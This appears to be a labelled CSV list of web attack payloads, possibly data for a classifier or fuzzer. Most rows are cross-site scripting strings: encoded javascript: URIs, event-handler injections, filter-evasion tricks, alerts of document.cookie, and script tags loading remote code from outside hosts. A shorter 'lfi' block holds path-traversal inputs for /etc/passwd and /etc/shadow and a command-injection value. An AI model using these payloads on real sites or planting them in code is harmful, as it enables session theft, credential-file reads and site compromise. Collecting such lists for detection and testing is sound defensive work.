xss,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
xss,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
xss,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
xss,<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
xss,<img src=`xx:xx`onerror=alert(1)>
xss,<img src=asdf onerror=alert(document.cookie)>
xss,<IMG SRC=javascript:alert('XSS')>
xss,<IMG SRC=JaVaScRiPt:alert('XSS')>
xss,<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
xss,<IMG SRC=javascript:alert(‘XSS’)>
xss,<IMG SRC=javascript:alert(&quot;XSS&quot;)>
xss,<img src=javascript:alert(&quot;XSS&quot;)>
xss,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
xss,<IMG SRC=javascrscriptipt:alert('XSS')>
xss,<img src=xss onerror=alert(1)>
xss,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">"
xss,<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
xss,<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
xss,<img/src=@&#32;&#13; onerror = prompt('&#49;')
xss,<img/src=`%00` onerror=this.onerror=confirm(1)
xss,<input onblur=write(XSS) autofocus><input autofocus>
xss,<input onfocus=write(XSS) autofocus>
xss,"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>"
xss,<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
xss,<input value=<><iframe/src=javascript:confirm(1)
xss,"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;"""
xss,<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
xss,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click"
xss,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click"
xss,"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>"
xss,"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>"
xss,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"
xss,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">"
xss,"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">"
xss,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">"
xss,"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">"
xss,"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>"
xss,<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
xss,<scr<script>ipt>alert(1)</scr</script>ipt>
xss,<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
xss,"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
xss,<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
xss,<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
xss,<script ^__^>alert(String.fromCharCode(49))</script ^__^
xss,<script ~~~>alert(0%0)</script ~~~>
xss,<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
xss,"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
xss,"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
xss,"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
xss,<script itworksinallbrowsers>/*<script* */alert(1)</script
xss,"<script src=""#"">{alert(1)}</script>;1"
xss,"<script src=""data:text/javascript,alert(1)""></script>"
xss,"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>"
xss,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
xss,<script x> alert(1) </script 1=2
xss,<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
xss,"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F"
xss,"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
xss,"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>"
xss,"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script"
xss,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
xss,<script>({0:#0=alert/#0#/#0#(0)})</script>
xss,<script>({0:#0=alert/#0#/#0#(123)})</script>
xss,<script>+-+-1-+-+alert(1)</script>
xss,<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
xss,<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
xss,<script>alert(‘XSS’)</script>
xss,"<script>alert(""hellox worldss"");</script>"
xss,"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510"
xss,"<ScRipT>alert(""XSS"");</ScRipT>"
xss,"<script>alert(""XSS"");</script>&search=1"
xss,<script>alert(“XSS”);</script>
xss,<script>alert(“XSS”)</script>
xss,<script>alert(/XSS”)</script>
xss,<script>alert(/XSS/)</script>
xss,<ScRiPt>alert(1)</sCriPt>
xss,<script>alert(1)</script>
xss,<script>alert(123);</script>
xss,<script>alert(123)</script>
xss,"<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>"
xss,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
xss,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
xss,"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>"
xss,"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>"
xss,"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>"
xss,<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
xss,<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
xss,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>"
xss,"<style><img src=""</style><img src=x onerror=alert(123)//"">"
xss,"<style><img src=""</style><img src=x onerror=alert(XSS)//"">"
xss,<svg contentScriptType=text/vbs><script>MsgBox+1
xss,"<svg onload=""javascript:alert(123)"" xmlns=""#""></svg>"
xss,"<svg xmlns=""#""><script>alert(1)</script></svg>"
xss,"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>"
xss,<svg/onload=alert(1)
xss,<svg><script ?>alert(1)
xss,<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
xss,<svg><script onlypossibleinopera:-)> alert(1)
xss,<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
xss,"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
xss,<svg><script>//&NewLine;confirm(1);</script </svg>
xss,<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
xss,"<TABLE BACKGROUND=""javascript:alert('XSS')"">"
xss,"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">"
xss,"<var onmouseover=""prompt(1)"">On Mouse Over</var>"
xss,<video src=1 onerror=alert(1)>
xss,"<XSS STYLE=""xss:expression(alert('XSS'))"">"
xss,"0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search"
xss,¼script¾alert(¢XSS¢)¼/script¾
xss,"a=""get"";b=""URL(ja\"""";c=""vascr"";d=""ipt:ale"";e=""rt('XSS');\"")"";eval(a+b+c+d+e);"
xss,"a=\""get\"";"
xss,"b=\""URL(\\""\"";"
xss,"c=\""javascript&#058;\"";"
xss,"d=\""alert('XSS');\\"")\"";"
xss,"echo('IPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;'); ?&gt;"
xss,eval(a+b+c+d);
xss,"exp/*&lt;A STYLE='no\xss&#58;noxss(\""*//*\"");"
xss,"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>"
xss,foo\’; alert(document.cookie);//’;
xss,foo<script>alert(1)</script>
xss,foo<script>alert(document.cookie)</script>
xss,http://www.<script>alert(1)</script .com
xss,http://www.google<script .com>alert(document.location)</script
xss,"javascript:alert(""hellox worldss"")"
xss,"LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>"
xss,"perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(\\""XSS\\"")&gt;\"";' &gt; out"
xss,"perl -e 'print \""&lt;SCR\0IPT&gt;alert(\\""XSS\\"")&lt;/SCR\0IPT&gt;\"";' &gt; out"
xss,Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
xss,"xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\""XSS\""))'&gt;"
xss,žscriptualert(EXSSE)ž/scriptu
lfi,etc/passwd
lfi,etc/passwd%00
lfi,../../etc/passwd
lfi,%252e%252e%252f
lfi,....//....//etc/passwd
lfi,%00
lfi,"data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"
lfi,../
lfi,../../../../../../../..//etc/shadow
lfi,cmd=ls%20-all
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,
,